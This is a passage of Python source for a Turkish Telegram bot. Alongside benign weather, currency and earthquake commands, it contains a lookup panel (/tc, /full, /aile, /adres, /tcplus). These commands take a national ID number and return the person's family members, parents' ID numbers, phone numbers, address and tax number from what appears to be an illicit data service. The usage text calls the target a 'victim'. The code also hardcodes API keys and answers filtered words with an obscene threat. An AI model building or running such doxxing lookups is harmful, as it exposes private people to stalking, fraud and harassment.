    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir şehir adı belirtin. Örnek: /hava ankara")
        return

    
    sehir = message.text.split()[1]

    
    url = f"https://api.openweathermap.org/data/2.5/weather?q={sehir}&appid=a3b2f4740abf2ee79ee7f71b2f40543e&units=metric&lang=tr"
    response = requests.get(url)

   
    if response.status_code == 200:
        data = response.json()
    
        # Emoji tanımları
        emoji_bulut = "☁️"
        emoji_gunes = "☀️"
        emoji_yagmur = "🌧️"
        emoji_ruzgar = "🌬️"
    
       
        hava_durumu = f"Hava Durumu Bilgileri - {data['name']} 🏙️\n"
        hava_durumu += f"{emoji_bulut} Durum: {data['weather'][0]['description']}\n"
        hava_durumu += f"{emoji_gunes} Sıcaklık: {data['main']['temp']}°C\n"
        hava_durumu += f"{emoji_gunes} En Yüksek Sıcaklık: {data['main']['temp_max']}°C\n"
        hava_durumu += f"{emoji_yagmur} En Düşük Sıcaklık: {data['main']['temp_min']}°C\n"
        hava_durumu += f"{emoji_yagmur} Nem Oranı: {data['main']['humidity']}%\n"
        hava_durumu += f"{emoji_ruzgar} Rüzgar Hızı: {data['wind']['speed']} m/s\n"

        
        bot.send_message(message.chat.id, hava_durumu)
    else:
        bot.send_message(message.chat.id, "Hava durumu bilgisi alınamadı. Lütfen geçerli bir şehir adı belirtin.")
        

def get_country_info(country_name):
    url = f'https://restcountries.com/v3.1/name/{country_name}'
    response = requests.get(url)
    if response.status_code == 200:
        try:
            data = response.json()
            country_data = data[0]  # API genellikle bir liste içinde döndürüyor, ilk öğe bizim istediğimiz ülkenin verilerini içerir

            country_name_common = country_data['name']['common']
            country_name_official = country_data['name']['official']
            capital = ', '.join(country_data['capital'])
            population = country_data['population']
            area = country_data['area']
            currency_name = list(country_data['currencies'].values())[0]['name']
            currency_symbol = list(country_data['currencies'].values())[0]['symbol']
            languages = ', '.join(country_data['languages'].values())
            flag_url = country_data['flags']['png']
            region = country_data['region']
            subregion = country_data['subregion']

            info_text = (
                f"<b>{country_name_official} ({country_name_common})</b>\n\n"
                f"<b>Başkent:</b> {capital}\n"
                f"<b>Nüfus:</b> {population:,}\n"
                f"<b>Alan:</b> {area:,} km²\n"
                f"<b>Para Birimi:</b> {currency_name} ({currency_symbol})\n"
                f"<b>Dil:</b> {languages}\n"
                f"<b>Irk:</b> {region}\n"
                f"<b>Alt Bölge:</b> {subregion}\n"
            )
            return info_text, flag_url
        except Exception as e:
            print(f'Hata oluştu: {e}')
            return None, None
    else:
        print(f'Response status code: {response.status_code}')
        return None, None


@bot.message_handler(commands=['ulke'])
def send_country_info(message):
    
    try:
        country = message.text.split(maxsplit=1)[1]
        info_text, flag_url = get_country_info(country)
        if info_text and flag_url:
            full_message = f"{info_text}\n\n🌍 Bayrak: {flag_url}"
            bot.send_message(message.chat.id, full_message, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, f"{country} hakkında bilgi bulunamadı.")
    except IndexError:
        bot.send_message(message.chat.id, "Lütfen /ulke komutundan sonra bir ülke adı yazın.\nÖrnek: /ulke Turkey")
    except Exception as e:
        bot.send_message(message.chat.id, f"Bir hata oluştu: {e}")


def translate_word(word):
    url = f'https://api.dictionaryapi.dev/api/v2/entries/en/{word}'
    response = requests.get(url)
    if response.status_code == 200:
        try:
            data = response.json()
            meanings = data[0]['meanings']
            translation = meanings[0]['definitions'][0]['definition']
            return translation
        except Exception as e:
            print(f'Hata oluştu: {e}')
            return None
    else:
        print(f'Response status code: {response.status_code}')
        return None






@bot.message_handler(commands=['eskikur'])
def eski_kur_gonder(message):
    
    
    
    
    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Lütfen bir tarih belirtin. Örnek: /eskikur 2022-01-01")
        return

   
    tarih = message.text.split()[1]

   
    url = f"https://api.frankfurter.app/{tarih}..?from=USD&to=TRY"
    response = requests.get(url)

   
    if response.status_code == 200:
        data = response.json()
        
        text = "Tarih: Kuru\n"
        sonuclar = list(data['rates'].items())[:5]
        for tarih, kur in sonuclar:
            text += f"{tarih}: {kur}\n"
        
        bot.send_message(message.chat.id, text)
    else:
        bot.send_message(message.chat.id, "Kur bilgisi alınamadı. Lütfen geçerli bir tarih belirtin.")
        
gpt_enabled = False

def is_admin(user_id, chat_id):
    chat_admins = bot.get_chat_administrators(chat_id)
    for admin in chat_admins:
        if admin.user.id == user_id:
            return True
    return False





# Filtreli kelimeleri belirtin
filtreli_kelimeler = ["Atatürk", "Allah", "ALLAH", "Ataturk", "allah", "siktim", "atanızı", "atanı", "allahını", "alahını", "ata", "allahınızı"]

@bot.message_handler(commands=['ses'])
def metni_sese_donustur(message):
    
    
    
    if len(message.text.split()) < 2:  
        metin = "Bot Altyapı Chat grubuna katılmayı unutma" 
    else:
        metin = " ".join(message.text.split()[1:]) 

    # Filtreli kelimelerin kontrolü
    if any(kelime in metin for kelime in filtreli_kelimeler):
        bot.send_message(message.chat.id, "Bidaha Böyle Birşey Yaparsan O Anneni Sikerim. ")
    else:
        response = requests.get(f'https://tilki.dev/api/yaziyi-ses-yapma?text={metin}')

       
        keyboard = types.InlineKeyboardMarkup()
        url = f"https://t.me/BotAltyapiChat"
        button = types.InlineKeyboardButton(text="Chatte katılmayı unutma", url=url)
        keyboard.add(button)

       
        bot.send_audio(message.chat.id, response.content, reply_markup=keyboard)

        
        log_chat_id = -1002228388312  # Log grubunun ID'sini buraya yazın
        
        user_info = bot.get_chat_member(log_chat_id, message.from_user.id)
        username = user_info.user.username if user_info.user.username else user_info.user.first_name

        with open("ses.mp3", "wb") as audio_file:
            audio_file.write(response.content)
        with open("ses.mp3", "rb") as audio:
            bot.send_audio(log_chat_id, audio, caption=f"{metin} - İsteyen: @{username}")

        os.remove("ses.mp3")  # İndirilen dosyayı sil

@bot.message_handler(commands=['morse'])
def morse_kodunu_gonder(message):
    
    
    
    try:
       
        metin = message.text.split()[1]

      
        response = requests.get(f'https://tilki.dev/api/morse?text={metin}')
        response.raise_for_status()  # Hata durumunu kontrol et

        data = response.json()

       
        text = f"Morse Kodu: {data['text']}"

       
        bot.send_message(message.chat.id, text)
    
    except (IndexError, KeyError):
        
        error_message = "Lütfen geçerli bir metin girin. Morse kodunu çözümlemek için /morse komutunu kullanın."
        bot.send_message(message.chat.id, error_message)

    except requests.exceptions.HTTPError as e:
       
        error_message = "API isteği sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin."
        bot.send_message(message.chat.id, error_message)

@bot.message_handler(commands=['ayet'])
def ayet_gonder(message):
    
    
    
    try:
      
        response = requests.get('https://tsgchecker.tsgmods.com.tr/yunus/ayet.php')
        response.raise_for_status()  # Hata durumunu kontrol et

        data = response.json()

       
        text = f"{data['text']}"

       
        bot.send_message(message.chat.id, text)
    
    except requests.exceptions.HTTPError as e:
       
        error_message = "API isteği sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin."
        bot.send_message(message.chat.id, error_message)

    except Exception as e:
       
        error_message = "Bir hata oluştu. Lütfen daha sonra tekrar deneyin."
        bot.send_message(message.chat.id, error_message)
@bot.message_handler(commands=['tdk'])
def tdk_bilgilerini_gonder(message):
    
    
    
 
    kelimeler = message.text.split()[1:]
    if not kelimeler:
        bot.send_message(message.chat.id, "Lütfen bir kelime girin. Örnek: /tdk elma")
        return

    kelime = " ".join(kelimeler)

   
    response = requests.get(f'https://tilki.dev/api/tdk?q={kelime}')

    if response.status_code == 200:
       
        data = response.json()

       
        text = f"Kelime: {data['madde']}\n"
        text += f"Anlam: {data['anlam']}\n"

     
        bot.send_message(message.chat.id, text)

    else:
       
        bot.send_message(message.chat.id, f"Üzgünüm, '{kelime}' kelimesi için TDK'de bilgi bulamadım.")


EXCHANGE_RATE_API_URL = 'https://api.exchangerate-api.com/v4/latest/EUR'


def get_euro_to_try() -> float:
    """Güncel Euro/TL kurunu döndürür."""
    response = requests.get(EXCHANGE_RATE_API_URL)
    data = response.json()
    return data['rates']['TRY']

@bot.message_handler(commands=['euro'])
def send_euro_rate(message):
    
    """Euro/TL kurunu yanıt olarak gönderir."""
    try:
        euro_to_try = get_euro_to_try()
        bot.reply_to(message, f"Güncel Euro Kuru: {euro_to_try}₺")
    except Exception as e:
        bot.reply_to(message, "Üzgünüm, güncel Euro kuru alınırken bir hata oluştu.")



def get_tdk_meaning(word):
    url = f'https://sozluk.gov.tr/gts?ara={word}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        if data:
            meanings = []
            for anlam in data[0]['anlamlarListe']:
                anlam_metni = anlam['anlam']
                meanings.append(anlam_metni)
            atasozleri = [atasoz['madde'] for atasoz in data[0].get('atasozu', [])]
            response_text = f"**{word.capitalize()}** kelimesinin anlamları:\n\n"
            for idx, meaning in enumerate(meanings, start=1):
                response_text += f"{idx}. {meaning}\n"
            if atasozleri:
                response_text += "\n**Atasözleri:**\n"
                for atasoz in atasozleri:
                    response_text += f"- {atasoz}\n"
            return response_text
    return "Kelime bulunamadı veya bir hata oluştu."


FOOTBALL_DATA_API_KEY = 'dd3cde87193544cebc2093128fe4b899'



def get_live_scores():
    url = 'https://api.football-data.org/v2/matches'
    headers = {
        'X-Auth-Token': FOOTBALL_DATA_API_KEY
    }
    params = {
        'status': 'LIVE' 
    }
    try:
        response = requests.get(url, headers=headers, params=params)
        data = response.json()
        
        if response.status_code == 200:
            matches = data.get('matches', [])
            live_scores = []
            
            for match in matches:
                home_team = match['homeTeam']['name']
                away_team = match['awayTeam']['name']
                score = f"{match['score']['fullTime']['homeTeam']} - {match['score']['fullTime']['awayTeam']}"
                live_scores.append(f"{home_team} vs {away_team}: {score}")
            
            return live_scores
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(f"Request hatası: {e}")
        return None
    except Exception as e:
        print(f"Genel hata: {e}")
        return None


@bot.message_handler(commands=['mac'])
def send_live_scores(message):
    try:
        scores = get_live_scores()
        if scores:
            result = "\n".join(scores)
            bot.reply_to(message, result)
        else:
            bot.reply_to(message, "Canlı maç bilgisi bulunamadı, lütfen daha sonra tekrar deneyiniz.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {e}")

@bot.message_handler(commands=['tdk'])
def send_word_meaning(message):
    
    try:
        word = message.text.split(maxsplit=1)[1]
        meaning = get_tdk_meaning(word)
    except IndexError:
        meaning = "Lütfen /tdk komutundan sonra bir kelime yazın.\nÖrnek: /tdk kitap"
    bot.send_message(message.chat.id, meaning, parse_mode='Markdown')


@bot.message_handler(commands=['deprem'])
def deprem_verilerini_gonder(message):
    
    
    
    response = requests.get('https://deprem.tilki.dev/')
    data = response.json()

   
    data = data[:5]

    message_text = "Son 5 Deprem Bilgisi:\n\n"
    
    for i, deprem in enumerate(data, start=1):
        message_text += f"Deprem {i}:\n"
        message_text += f"Tarih: {deprem['tarih']}\n"
        message_text += f"Saat: {deprem['saat']}\n"
        message_text += f"Enlem: {deprem['enlem']}\n"
        message_text += f"Boylam: {deprem['boylam']}\n"
        message_text += f"Derinlik: {deprem['derinlik']}\n"
        message_text += f"Büyüklük: {deprem['buyukluk']}\n"
        message_text += f"Yer: {deprem['yer']}\n"
        message_text += f"Şehir: {deprem['sehir']}\n\n"

    bot.send_message(message.chat.id, message_text)
APIM_URL = 'https://www.doviz.com/'

def get_dollar_exchange_rate():
    response = requests.get(APIM_URL)
    soup = BeautifulSoup(response.content, 'html.parser')
    dollar_rate = soup.find('span', {'data-socket-key': 'USD'}).text
    return dollar_rate

@bot.message_handler(commands=['dolar'])
def send_dollar_exchange_rate(message):
    
    dollar_rate = get_dollar_exchange_rate()
    bot.reply_to(message, f"Güncel dolar kuru: {dollar_rate}₺")


  



@bot.message_handler(commands=['operator'])
def operator(message):
    

    user_first_name = message.from_user.first_name

    gsm = message.text.split()[1] if len(message.text.split()) > 1 else None

    if not gsm:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, '*⚠️ Lütfen geçerli bir GSM Numarası girin!.\nÖrnek:* `/operator 5553723339`', parse_mode="Markdown")
        return

    try:

        api_url = f"http://localhost/yunus/operator.php?gsm={gsm}"
        response = requests.get(api_url)
        response.raise_for_status()

        
        data = response.json()
        if not data:
            bot.send_chat_action(message.chat.id, 'typing')
            time.sleep(0.1)
            bot.reply_to(message, '⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode="Markdown")
            return

        result_text = f"╭─━━━━━━━━━━━━─╮\n┃*GSM:* `{data['gsm']}`\n┃*Operatör:* `{data['operator']}`\n╰─━━━━━━━━━━━━─╯"
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(0.1)
        bot.reply_to(message, result_text, parse_mode="Markdown")
        increment_query_count()
    except requests.exceptions.HTTPError as errh:
        bot.reply_to(message, f'Hata! HTTP Error: {errh}')

    except requests.exceptions.ConnectionError as errc:
        bot.reply_to(message, f'Hata! Bağlantı Hatası: {errc}')

    except requests.exceptions.Timeout as errt:
        bot.reply_to(message, f'Hata! Zaman Aşımı Hatası: {errt}')

    except requests.exceptions.RequestException as err:
        bot.reply_to(message, f'Hata! Genel Hata: {err}')

    except Exception as e:
        bot.send_chat_action(message.chat.id, 'typing')
        time.sleep(2)
        bot.reply_to(message, f'⚠️ *Girdiğiniz Bilgiler ile Eşleşen Biri Bulunamadı!*', parse_mode="Markdown")
     
 
@bot.message_handler(commands=['tiktok'])
def trigger_download(message):
    
    try:
        url = message.text.split(' ', 1)[1]  # '/tiktok ' kısmını kaldırarak sadece linki al
        process_tiktok_link(message, url)
    except IndexError:
        bot.reply_to(message, "Lütfen TikTok video linkini girin. Örnek /tiktok https://vm.tiktok.com/ZMrFTSt1y/")

def process_tiktok_link(message, url):
    try:
        if validate_tiktok_link(url):
            headers = {
                "referer": "https://lovetik.com/sa/video/",
                "origin": "https://lovetik.com",
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
            }

            payload = {"query": url}
            response = requests.post("https://lovetik.com/api/ajax/search", headers=headers, data=payload).json()

            video_info = {
                "authorUser": response['author'],
                "authorName": response['author_name'],
                "authorImage": response['author_a'],
                "cover": response['cover'],
                "vidID": response['vid'],
                "desc": response["desc"],
                "link": response['links'][4]['a'],
                "audioName": response['links'][5]['s'],
                "audioLink": response['links'][5]['a']
            }

            bot.send_video(message.chat.id, video_info['link'], caption="- Video Başarıyla İndirildi @BotAltyapiChat.")
        else:
            bot.reply_to(message, "Geçersiz TikTok video linki. Lütfen doğru bir TikTok video linki girin. Örnek/n /tiktok https://vm.tiktok.com/ZMrFTSt1y/")

    except Exception as e:
        bot.send_message(message.chat.id, f"- Bağlantı geçersiz! Hata: {str(e)}")

def validate_tiktok_link(url):
    try:
        req = requests.get(url)
        if "tiktok.com" in req.url:
            return True
        return False
    except:
        return False



@bot.message_handler(commands=['sou'])
def handle_sorgu(message):
    sorgu_bilgileri = """
🚀 Sorgu Bölümü:
/adsoyad - Ad Soyad Sorgu
/adsoyadil - Ad Soyad İl Sorgu
/adsoyadililce - Ad Soyad İl İlçe Sorgu
/tc - TC Sorgu
/cocuk - Çocuk Sorgu
/yegen - Yeğen Sorgu
/aile - Aile Sorgu
/ailepro - Aile Sorgu Pro
/tcgsm - TC'den GSM Sorgu
/gsmtc - GSM'den TC Sorgular
/iban - İban Sorgu
/hayathikayesi - Hayatı Hikayesi Sorgular
/adres - Adres Sorgular
    """
    bot.send_message(message.chat.id, sorgu_bilgileri, parse_mode='Markdown')

AFAD_API_URL = 'https://deprem.afad.gov.tr/last-earthquakes.html'

def get_last_earthquakes():
    response = requests.get(AFAD_API_URL)
    if response.status_code == 200:
        earthquakes = response.json()[:5]  # Son 5 depremi al
        earthquake_list = []
        for quake in earthquakes:
            magnitude = quake['mag']
            location = quake['lokasyon']
            depth = quake['depth']
            date = quake['date']
            earthquake_list.append(f"Yer: {location}\nBüyüklük: {magnitude}\nDerinlik: {depth} km\nTarih: {date}\n")
        return earthquake_list
    else:
        return None


@bot.message_handler(commands=['deprem1'])
def send_earthquakes(message):
    
    earthquakes = get_last_earthquakes()
    if earthquakes:
        reply = "Son 5 Deprem:\n\n" + "\n".join(earthquakes)
    else:
        reply = "Deprem bilgileri getirilemedi."
    bot.send_message(message.chat.id, reply)



LOG_CHAT_ID = '-1002228388312'  
@bot.message_handler(commands=['tc'])
def handle_tc_command(message):
    
    try:
       
        user_message = message.text.split()
        
        
        if len(user_message) != 2:
            bot.reply_to(message, "Lütfen doğru formatta TC kimlik numarası giriniz. Örneğin: /tc 12345678901")
            return
        
       
        tc_no = user_message[1]
        
        
        api_url = f"https://tsgchecker.tsgmods.com.tr/yunus/adpro.php?auth=tsgxyunus&tc={tc_no}"
        
       
        response = requests.get(api_url)
        
        
        if response.status_code == 200:
           
            data = response.json()
            
           
            if data.get('success') == 'true' and data.get('number', 0) > 0:
                entry = data['data'][0]  # İlk veriyi al (normalde sorgu tek bir sonuç döndürecek)
                
               
                response_message = (
                    f"╭━━━━━━━━━━━━━━\n"
                    f"┃ TSG ID: {entry.get('ID')}\n"
                    f"┃ TC: {entry.get('TC')}\n"
                    f"┃ Ad: {entry.get('AD')}\n"
                    f"┃ Soyad: {entry.get('SOYAD')}\n"
                    f"┃ GSM: {entry.get('GSM', 'Yok')}\n"
                    f"┃ Baba Adı: {entry.get('BABAADI')}\n"
                    f"┃ Baba TC: {entry.get('BABATC')}\n"
                    f"┃ Anne Adı: {entry.get('ANNEADI')}\n"
                    f"┃ Anne TC: {entry.get('ANNETC')}\n"
                    f"┃ Doğum Tarihi: {entry.get('DOGUMTARIHI')}\n"
                    f"┃ Ölüm Tarihi: {entry.get('OLUMTARIHI')}\n"
                    f"┃ Doğum Yeri: {entry.get('DOGUMYERI')}\n"
                    f"┃ Memleket İl: {entry.get('MEMLEKETIL')}\n"
                    f"┃ Memleket İlçe: {entry.get('MEMLEKETILCE')}\n"
                    f"┃ Memleket Köy: {entry.get('MEMLEKETKOY')}\n"
                    f"┃ Adres İl: {entry.get('ADRESIL')}\n"
                    f"┃ Adres İlçe: {entry.get('ADRESILCE')}\n"
                    f"┃ Aile Sıra No: {entry.get('AILESIRANO')}\n"
                    f"┃ Birey Sıra No: {entry.get('BIREYSIRANO')}\n"
                    f"┃ Medeni Hal: {entry.get('MEDENIHAL')}\n"
                    f"┃ Cinsiyet: {entry.get('CINSIYET')}\n"
                    f"╰━━━━━━━━━━━━━━\n\n"
                    f"Botumuz > @BotAltyapi_Bot\n"
                )
                
                
                bot.reply_to(message, response_message)
            
            else:
                bot.reply_to(message, "Belirtilen TC kimlik numarası için bilgi bulunamadı.")
        
        else:
           
            bot.reply_to(message, "Veri alınamadı. Lütfen daha sonra tekrar deneyin.")
    
    except Exception as e:
        print(f'Hata oluştu: {e}')
        bot.reply_to(message, "İşlem sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.")



def get_person_info(tc):
    url = f"https://tsgchecker.tsgmods.com.tr/yunus/adpro.php?auth=tsgxyunus&tc={tc}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data.get("success") == "true":
            return data.get("data")[0]
        else:
            return None
    else:
        return None


def create_life_story(person_info):
    if not person_info:
        return "Bilgiler getirilemedi veya TC kimlik numarası geçersiz."
    
    name = person_info['AD']
    surname = person_info['SOYAD']
    birth_date = person_info['DOGUMTARIHI']
    birth_place = person_info['DOGUMYERI']
    gender = "Kadın" if person_info['CINSIYET'] == "Kadın" else "Erkek"
    father_name = person_info['BABAADI']
    father_tc = person_info['BABATC']
    mother_name = person_info['ANNEADI']
    mother_tc = person_info['ANNETC']
    address_city = person_info['ADRESIL']
    address_district = person_info['ADRESILCE']
    hometown_city = person_info['MEMLEKETIL']
    hometown_district = person_info['MEMLEKETILCE']
    hometown_village = person_info['MEMLEKETKOY']
    marital_status = person_info['MEDENIHAL']
    
    story = (
        f"{name} {surname}, {birth_date} tarihinde {birth_place} doğumlu olup "
        f"{gender} cinsiyetindedir. Babası {father_name} ({father_tc}) ve annesi {mother_name} ({mother_tc})'dir. "
        f"{name}, aslen {hometown_city} ili {hometown_district} ilçesi {hometown_village} köyündendir. "
        f"Şu an {address_city} ilinin {address_district} ilçesinde ikamet etmektedir. "
        f"{marital_status} olan {name} {surname}, hayatını bu şekilde sürdürmektedir."
    )
    return story




@bot.message_handler(commands=['full'])
def full(message):
    try:
        tc = message.text.split()[1]  
        url = f"https://tsgchecker.tsgmods.com.tr/yunus/full.php?tc={tc}"
        response = requests.get(url)
        data = response.json()

        if data:
            user_info = f"""
*ADI*: {data['ADI']}
*SOYADI*: {data['SOYADI']}
*TC*: {data['TC']}
*DOĞUM TARİHİ*: {data['DOGUMTARIHI']}
*YAŞ*: {data['YAS']}
*BURÇ*: {data['BURC']}
*AYAK NO*: {data['AYAKNO']}
*KIZLIK SOYADI*: {data['KIZLIKSOYADI']}
*NÜFUS İL*: {data['NUFUSIL']}
*NÜFUS İLÇE*: {data['NUFUSILCE']}
*ANNE ADI*: {data['ANNEADI']}
*ANNE TC*: {data['ANNETC']}
*BABA ADI*: {data['BABAADI']}
*BABA TC*: {data['BABATC']}
*ANNE GSM*: {', '.join([f"{gsm['GSM']} ({gsm['Operatör']})" for gsm in data['ANNE_GSM']])}
*BABA GSM*: {', '.join([f"{gsm['GSM']} ({gsm['Operatör']})" for gsm in data['BABA_GSM']])}
*KENDİ GSM*: {', '.join([f"{gsm['GSM']} ({gsm['Operatör']})" for gsm in data['KENDI_GSM']])}
            """
            bot.send_message(message.chat.id, user_info, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, "Veri bulunamadı.")
    except IndexError:
        bot.send_message(message.chat.id, "Lütfen bir TC numarası girin. Örneğin: /full 11111111110")
    except Exception as e:
        bot.send_message(message.chat.id, f"Hata oluştu: {str(e)}")

@bot.message_handler(commands=['hayathikayesi'])
def handle_hayathikayesi(message):
    
    try:
       
        tc = message.text.split()[1]
        person_info = get_person_info(tc)
        life_story = create_life_story(person_info)
        bot.send_message(message.chat.id, life_story)
    except IndexError:
        bot.reply_to(message, "Lütfen TC kimlik numarasını komutla birlikte girin.\nÖrnek: /hayathikayesi 12345678901")



@bot.message_handler(commands=["tcplus"])
def tcplus_sorgula(message):
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    log_message = f"Yeni TC Plus Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.split(' ')[1]}\n" \
                  f"Sorgulayan ID: {user_id}\n" \
                  f"Sorgulayan Adı: {user_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002228388312, log_message)

    channel_id = -1002245175746
    group_id = -1002228388312

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = (f"Merhaba {user_name}, ({user_id})!\n\n"
                    f"Sorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. "
                    f"Kanal ve chate katılıp tekrar deneyin.\n\n"
                    f"Kanal: @BotAltyapi\nChat: @BotAltyapiChat")
        bot.send_message(message.chat.id, response)
        return

    

    mesaj = message.text

    if mesaj.startswith("/tcplus"):
        tc = mesaj.replace("/tcplus", "").strip()

        if tc:
            api_url = f"http://localhost/yunus/tcpro.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success") and "data" in json_data:
                    data = json_data["data"]
                    adi = data.get("AD", "")
                    soyadi = data.get("SOYAD", "")
                    dogum_tarihi = data.get("DOGUMTARIHI", "")
                    nufus_il = data.get("NUFUSIL", "")
                    nufus_ilce = data.get("NUFUSILCE", "")
                    anne_adi = data.get("ANNEADI", "")
                    anne_tc = data.get("ANNETC", "")
                    baba_adi = data.get("BABAADI", "")
                    baba_tc = data.get("BABATC", "")
                    uyruk = data.get("UYRUK", "")

                    gsm_mesaj = ""
                    for gsm_numarasi in data.get("gsm", []):
                        gsm_mesaj += f"┃➥ GSM: {gsm_numarasi}\n"

                    response_text = (f"""
╭━━━━━━━━━━━━━╮
┃➥ @BotAltyapi
╰━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━━╮
┃➥ TC: {tc}
┃➥ ADI: {adi}
┃➥ SOYADI: {soyadi}
┃➥ DOĞUM TARİHİ: {dogum_tarihi}
┃➥ NUFUS IL: {nufus_il}
┃➥ NUFUS ILCE: {nufus_ilce}
┃➥ ANNE ADI: {anne_adi}
┃➥ ANNE TC: {anne_tc}
┃➥ BABA ADI: {baba_adi}
┃➥ BABA TC: {baba_tc}
┃➥ UYRUK: {uyruk}
{gsm_mesaj}╰━━━━━━━━━━━━━━╯
""")

                    bot.send_message(message.chat.id, response_text)
                else:
                    cevap = "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯"
                    bot.send_message(message.chat.id, cevap)
            else:
                cevap = f"api hata kod: ({response.status_code}): {response.text}"
                bot.send_message(message.chat.id, cevap)
        else:
            cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
            bot.send_message(message.chat.id, cevap)
    else:
        cevap = "╭──────────────────────╮\n┃ 📛 𝖸𝖺𝗇𝗅ı𝗌̧ 𝖪𝗈𝗆𝗎𝗍 𝖪𝗎𝗅𝗅𝖺𝗇ı𝗆ı\n┃ ✅ 𝖣𝗈𝗀̆𝗋𝗎 𝖥𝗈𝗋𝗆𝖺𝗍: /tcplus <kurbanın tc>\n╰──────────────────────╯"
        bot.send_message(message.chat.id, cevap)




@bot.message_handler(commands=['aile'])
def handle_aile_command(message):
    
    try:
        
        user_message = message.text.split()
        
        
        if len(user_message) != 2:
            bot.reply_to(message, "Lütfen doğru formatta TC kimlik numarası giriniz.")
            return
        
        
        tc_no = user_message[1]
        
        
        api_url = f"https://tsgchecker.tsgmods.com.tr/yunus/aile.php?tc={tc_no}"
        
       
        response = requests.get(api_url)
        
      
        if response.status_code == 200:
           
            data = response.json()
            
           
            file_path = 'aile_bilgileri.txt'
            with open(file_path, 'w', encoding='utf-8') as file:
                for entry in data['data']:
                    file.write("---------------------------------------------------\n")
                    file.write(f"ID: {entry['ID']}\n")
                    file.write(f"TC: {entry['TC']}\n")
                    file.write(f"Ad: {entry['AD']}\n")
                    file.write(f"Soyad: {entry['SOYAD']}\n")
                    file.write(f"GSM: {entry['GSM']}\n")
                    file.write(f"Baba Adı: {entry['BABAADI']}\n")
                    file.write(f"Baba TC: {entry['BABATC']}\n")
                    file.write(f"Anne Adı: {entry['ANNEADI']}\n")
                    file.write(f"Anne TC: {entry['ANNETC']}\n")
                    file.write(f"Doğum Tarihi: {entry['DOGUMTARIHI']}\n")
                    file.write(f"Ölüm Tarihi: {entry['OLUMTARIHI']}\n")
                    file.write(f"Doğum Yeri: {entry['DOGUMYERI']}\n")
                    file.write(f"Memleket İl: {entry['MEMLEKETIL']}\n")
                    file.write(f"Memleket İlçe: {entry['MEMLEKETILCE']}\n")
                    file.write(f"Memleket Köy: {entry['MEMLEKETKOY']}\n")
                    file.write(f"Adres İl: {entry['ADRESIL']}\n")
                    file.write(f"Adres İlçe: {entry['ADRESILCE']}\n")
                    file.write(f"Aile Sıra No: {entry['AILESIRANO']}\n")
                    file.write(f"Birey Sıra No: {entry['BIREYSIRANO']}\n")
                    file.write(f"Medeni Hal: {entry['MEDENIHAL']}\n")
                    file.write(f"Cinsiyet: {entry['CINSIYET']}\n")
                    file.write(f"Yakınlık: {entry['Yakinlik']}\n")
                    file.write("\n")
            
           
            bot.send_document(message.chat.id, open(file_path, 'rb'), caption=f"TC Kimlik No: {tc_no} için aile bilgileri.")
            os.remove(file_path)

        else:
           
            bot.reply_to(message, "Veri alınamadı. Lütfen daha sonra tekrar deneyin.")
    
    except Exception as e:
        print(f'Hata oluştu: {e}')
        bot.reply_to(message, "İşlem sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.")


import requests

api_url = 'https://tsgchecker.tsgmods.com.tr/yunus/adres.php'


@bot.message_handler(commands=['adres'])
def get_info(message):
    
   
    try:
        command, tc = message.text.split()
    except ValueError:
        bot.reply_to(message, "Lütfen geçerli bir TC Kimlik numarası girin.")
        return

   
    params = {'tc': tc}
    response = requests.get(api_url, params=params)

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            tc = data['data']['TC']
            ad_soyad = data['data']['ADSOYAD']
            dogum_yeri = data['data']['DOGUMYERI']
            vergi_no = data['data']['VERGINO']
            adres = data['data']['ADRES']
            
            response_text = (
                f"<b>TC Kimlik Numarası:</b> {tc}\n"
                f"<b>Adı Soyadı:</b> {ad_soyad}\n"
                f"<b>Doğum Yeri:</b> {dogum_yeri}\n"
                f"<b>Vergi Numarası:</b> {vergi_no}\n"
                f"<b>Adres:</b> {adres}"
            )
            bot.reply_to(message, response_text, parse_mode='HTML')
        else:
            bot.reply_to(message, "Bir hata oluştu, lütfen daha sonra tekrar deneyin.")
    else:
        bot.reply_to(message, "Sunucudan veri alınırken bir hata oluştu.")




# /speedtest komutu için handler
@bot.message_handler(commands=['spest'])
def send_speedtest(message):
    bot.reply_to(message, "Internet hızınız ölçülüyor, lütfen bekleyin...")
    try:
        response = requests.get('https://api.fast.com/netflix/speedtest')
        data = response.json()
        
        download_speed = data['speeds']['download']  # Mbps
